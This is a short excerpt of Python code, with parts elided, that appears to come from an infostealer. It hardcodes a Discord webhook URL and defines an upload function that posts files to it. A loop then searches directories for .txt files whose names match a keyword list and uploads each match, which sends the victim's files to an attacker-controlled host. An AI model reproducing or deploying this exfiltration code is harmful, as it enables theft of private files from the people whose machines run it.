...
hook = "https://discord.com/api/webhooks/1396669022484959302/Wl2iVk3XkO5RroaLbP9Ah0MkL5NDUEq3NrI0LSwE7gIQDTslIOEwxE23AQXw-4CnAT-w"
...
def upload(file_path):
    ...
    try:
        with open(file_path, 'rb') as f:
            ...
            response = requests.post(hook, files=files)
...
#     LoadRequests("POST", hook, files=files)    _
        ...
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and ".txt" in file:
                    fifound.append([path + "/" + file, upload(path + "/" + file)])
                    break
